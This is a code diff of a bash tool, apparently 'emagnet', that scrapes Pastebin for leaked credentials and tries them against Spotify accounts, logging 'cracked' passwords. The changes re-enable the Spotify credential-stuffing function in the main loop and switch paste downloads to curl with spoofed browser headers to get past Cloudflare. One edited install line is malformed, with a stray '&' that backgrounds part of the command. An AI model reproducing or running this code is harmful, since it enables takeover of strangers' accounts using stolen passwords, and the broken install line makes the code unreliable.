@@ -287,14 +287,13 @@ EOF
 
 CONF="$HOME/.config/emagnet/emagnet.conf"
 
-
 #### Just for make it easier to read main script
-emagnet_clear() { 
+emagnet_clear() {
     clear
 }
 
 #### Check for a working connection, using google since it is up 24/7 
-emagnet_iconnection() { 
+emagnet_iconnection() {
     ping -i "1" -c 1 google.com &> /dev/null
         if [[ "$?" -gt "0" ]]; then 
             echo -e "$basename$0: internal error -- this feature require a inernet connection but you seems to be offline, exiting.."
@@ -348,7 +347,7 @@ INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"
     [[ "$?" = "0" ]] &&  echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens has been killed\n"
     done
  fi
-   
+
    if [[ "$NRESESSIONS" -lt "3" ]]; then 
      echo -e "$basename$0: internal error -- 0 emagnet sessions is currently running";else 
      echo -e "$basename$0: killed $(echo $NRESESSIONS-2|bc) emagnet sessions"
@@ -714,11 +713,11 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $SPOTIFY_TARGETS
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> "$SPOTIFY_TARGETS"
 	     while read line; do
                	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
       	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-	           sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+	           ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
@@ -737,7 +736,7 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
                	       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
               fi
-            done < $SPOTIFY_TARGETS
+            done < "$SPOTIFY_TARGETS"
 
 }
 
@@ -874,7 +873,11 @@ emagnet_main() {
   ls -1 $EMAGNETALL|sort > "$HOME/.config/emagnet/tmp/.emagnet-temp2"
   cat "$HOME/.config/emagnet/tmp/.emagnet-temp1"|sort|awk '!seen[$0]++'|cut -d'/' -f4 > "$HOME/.config/emagnet/tmp/.emagnet-temp3"
   grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3"|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-download"
-        
+
+# Before we can download stuff from pastebin, we must insert http://pastebin.com/raw/<file_name> in
+# emagnet-download since we just want to download new files that not already is in our all-files
+      sed -i 's/^/https:\/\/pastebin.com\/raw\//g' "$HOME/.config/emagnet/tmp/.emagnet-download"
+
 #-----------------------------------------------------
 # If cloudfare is trigged, then we will do below 
 # - We wont be allowed to use wget without
@@ -883,25 +886,19 @@ emagnet_main() {
 # change this if you have a faster, better and more 
 # stable way to do this if cloudfare is triggered
 #-----------------------------------------------------
-#while read line; do
-#curl -sL $PASTEBIN \
-#     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H \
-#     -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' \
-#     -H 'Cookie: __cfduid=.....; cf_clearance=..; PHPSESSID=.....; _ga=....; _gid=.... __gads=ID=... _gat_UA-58643-34=1' \
-#     -H 'Upgrade-Insecure-Requests: 1' \
-#     -H 'Cache-Control: max-age=0' \
-#     -H 'TE: Trailers'
-#    -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');
-#done < "$HOME/.config/emagnet/tmp/.emagnet-temp3" &> /dev/null
-
-# Before we can download stuff from pastebin, we must insert http://pastebin.com/raw/<file_name> in
-# emagnet-download since we just want to download new files that not already is in our all-files
-      sed -i 's/^/https:\/\/pastebin.com\/raw\//g' "$HOME/.config/emagnet/tmp/.emagnet-download"
+while read line; do
+curl -sL $PASTEBIN \
+     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H \
+     -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' \
+     -H 'Cookie: __cfduid=.....; cf_clearance=..; PHPSESSID=.....; _ga=....; _gid=.... __gads=ID=... _gat_UA-58643-34=1' \
+     -H 'Upgrade-Insecure-Requests: 1' \
+     -H 'Cache-Control: max-age=0' \
+     -H 'TE: Trailers' \
+     -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');done < "$HOME/.config/emagnet/tmp/.emagnet-download2" &> /dev/null
 
 # Downloading new pastes we found, no duplicates will be downloaded of course
- 
 #     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
-     xargs -P "8" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
+#     xargs -P "8" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
 # Cleanup, we don't need these files after we downloaded them.
       rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &> /dev/null
       tt="$(ls $EMAGNETTEMP| wc -l)"
@@ -1331,7 +1328,8 @@ printf "..ok\n"
 sleep 1
 printf "%s" "Downloading libspoify........"; wget -q https://nr1.nu/archive/libspotify/12.1.51/amd64/libspotify_12.1.51.orig-amd64.tar.gz -P /tmp; printf "ok\n"
 printf "%s" "Extracting libspoify..,......"; tar -xf /tmp/libspotify_12.1.51.orig-amd64.tar.gz -C /tmp; printf "ok\n"
-printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/ && make install prefix=/usr/local &> /dev/null; printf "ok\n"
+printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/&> /dev/null; printf "ok\n"  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
+#printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
 printf "%s" "Preparing emagnet.conf......."; emagnet_conf;sed -i '248d' "$CONF";sed -i '248 i LIBSPOTIFY=true' "$CONF"; printf "ok\n"
 echo -e "\nAll done, will continue in 3 seconds!"
 sleep 2
@@ -1360,15 +1358,8 @@ fi
                               echo -e "Hold on, downloading sconsify.."
                               wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                               echo -e "Unzipping sconsify into current dir.."
-                              echo $PATH|grep -qow "\/usr\/local\/bin"
-                              if [[ $? -eq 0 ]]; then
-                                  unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-                                  mv ./sconsify /usr/local/bin &> /dev/null
-                                  chmod +x /usr/local/bin/sconsify
-                              else
-                                  unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
-                                  chmod +x ./sconsify
-                              fi
+                              unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
+                              chmod +x ./sconsify
                               echo -e "Cleaning up..."
                               rm "linux-x86_64-sconsify-0.6.0-next.zip"
                               echo "All done, have fun!"
@@ -1388,7 +1379,7 @@ fi
                                 printf "\n%64s \n\n" | tr ' ' '='
                                 emagnet_run4ever
                                 printf "\n%64s \n\n" | tr ' ' '='
-                                #emagnet_spotify_bruter
+                                emagnet_spotify_bruter
                  fi
                                 mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                 else
